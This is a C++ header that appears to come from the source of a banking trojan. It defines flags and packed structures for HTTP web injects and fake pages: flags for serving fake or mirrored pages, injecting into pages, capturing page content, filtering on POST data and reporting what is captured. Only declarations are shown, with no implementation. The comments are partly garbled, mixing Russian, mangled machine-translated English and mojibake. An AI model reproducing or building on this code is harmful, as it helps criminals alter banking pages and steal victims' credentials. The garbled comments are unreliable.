/*
  Некотрые данне для HTTP-инжектов и HTTP-фейков.
*/
#pragma once

namespace HttpInject
{
  //Р¤Р»Р°РіРё HEADER.flags.

  enum
  {
    FLAG_IS_FAKE                  = 0x0001, //The structure is a fakie.
    FLAG_IS_MIRRORFAKE            = 0x0002, //The structure is zaerkalom-fakie.
    FLAG_IS_INJECT                = 0x0004, //The structure is injected.
    FLAG_IS_CAPTURE               = 0x0008, //The structure is zavatom context.

    FLAG_ONCE_PER_DAY             = 0x0010, //Run structure of every 24-hours.
    FLAG_REQUEST_POST             = 0x0020, //Zapsukat structure on a POST-request.
    FLAG_REQUEST_GET              = 0x0040, //Zapsukat structure on the GET-request.

    FLAG_CAPTURE_NOTPARSE         = 0x0100, //Not to remove HTML-tags from zavachenogo content.
    FLAG_CAPTURE_TOFILE           = 0x0200, //Write result zavata content to a file instead of the report.
    
    FLAG_URL_CASE_INSENSITIVE     = 0x1000, //Compare URL insensitive (only English. Characters).
    FLAG_CONTEXT_CASE_INSENSITIVE = 0x2000  //Compare the contents without uchtea register.
  };

# pragma pack(push, 1)
  typedef struct
  {
    WORD flags;             //Flags FLAG_ *.
    WORD size;              //Full size strktury.
    WORD urlMask;           //Position mask URL.
    WORD fakeUrl;           //Position create fake URL.
    WORD postDataBlackMask; //The position of the black-mask POST-data.
    WORD postDataWhiteMask; //The position of the White-mask POST-data.
    WORD blockOnUrl;        //The position of the URL, at call on which this structure will be blocked.
    WORD contextMask;       //Position mask koteksta.
  }HEADER;

  //Header content for injection produce.
  typedef struct
  {
    WORD size;    //Size of the data switches on the size of this structure.
    WORD flags;   //Flags.
  }INJECTBLOCK;
# pragma pack(pop)

  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Проверка корректности оффсетов в HEADER.

    IN header - HEADER.

    Return    - true - корректно,
                false - не корректно.
  */
  bool _isCorrectHeader(const HEADER *header);

  /*В В В В Validating set INJECTBLOCK.

В В В В IN block - set INJECTBLOCK.
В В В В IN size - the size of the set.

В В В В Return - true - well,
В В В В В В В В В В В В В В В В false - is not correct.
В В */
  bool _isCorrectBlockList(const INJECTBLOCK *block, DWORD size);
};
